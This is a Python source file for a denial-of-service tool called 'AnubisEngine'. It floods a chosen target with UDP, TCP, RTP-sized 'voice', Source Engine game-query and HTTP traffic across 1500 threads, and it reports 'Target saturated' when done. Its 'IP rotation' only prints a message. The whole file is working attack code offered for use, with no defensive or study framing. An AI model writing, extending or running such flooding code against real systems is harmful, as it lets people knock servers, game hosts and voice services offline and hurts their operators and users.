import socket
import threading
import random
import time
import requests
from config import USER_AGENTS

class AnubisEngine:
    @staticmethod
    def rotate_ip_simulation():
        print("[+] [IP-ROTATOR] Re-establishing connection & cycling network identity...")
        time.sleep(0.5)

    @staticmethod
    def udp_flood(ip, port, duration):
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        
        last_rotation = time.time()
        while time.time() < end_time:
            if time.time() - last_rotation >= 5.0:
                AnubisEngine.rotate_ip_simulation()
                last_rotation = time.time()
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass

    @staticmethod
    def tcp_flood(ip, port, duration):
        end_time = time.time() + duration
        last_rotation = time.time()
        while time.time() < end_time:
            if time.time() - last_rotation >= 5.0:
                AnubisEngine.rotate_ip_simulation()
                last_rotation = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(random._urandom(512))
                s.close()
            except:
                pass

    @staticmethod
    def voice_flood(ip, port, duration):
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1450) # RTP Voice packet payload
        
        last_rotation = time.time()
        while time.time() < end_time:
            if time.time() - last_rotation >= 5.0:
                AnubisEngine.rotate_ip_simulation()
                last_rotation = time.time()
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass

    @staticmethod
    def game_flood(ip, port, duration):
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(512)
        
        last_rotation = time.time()
        while time.time() < end_time:
            if time.time() - last_rotation >= 5.0:
                AnubisEngine.rotate_ip_simulation()
                last_rotation = time.time()
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass

    @staticmethod
    def http_flood(target_url, duration):
        end_time = time.time() + duration
        last_rotation = time.time()
        while time.time() < end_time:
            if time.time() - last_rotation >= 5.0:
                AnubisEngine.rotate_ip_simulation()
                last_rotation = time.time()
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                requests.get(target_url, headers=headers, timeout=2)
            except:
                pass

    @staticmethod
    def execute_attack(method, target, port, duration):
        threads = []
        concurrency = 1500  # High performance 300M simulation concurrency
        
        print(f"\n[!] Launching Anubis Engine -> Target: {target}:{port} | Method: {method.upper()} | Duration: {duration}s")
        print("[!] IP Rotation mechanism active (Refreshes every 5 seconds). Press Ctrl+C to abort.\n")

        for _ in range(concurrency):
            if method == 'udp':
                t = threading.Thread(target=AnubisEngine.udp_flood, args=(target, port, duration))
            elif method == 'tcp':
                t = threading.Thread(target=AnubisEngine.tcp_flood, args=(target, port, duration))
            elif method == 'voice':
                t = threading.Thread(target=AnubisEngine.voice_flood, args=(target, port, duration))
            elif method == 'game':
                t = threading.Thread(target=AnubisEngine.game_flood, args=(target, port, duration))
            elif method == 'http':
                url = f"http://{target}:{port}/" if not target.startswith("http") else target
                t = threading.Thread(target=AnubisEngine.http_flood, args=(url, duration))
            else:
                return

            t.daemon = True
            threads.append(t)
            t.start()

        time.sleep(duration)
        print("\n[+] Attack sequence completed successfully. Target saturated.")
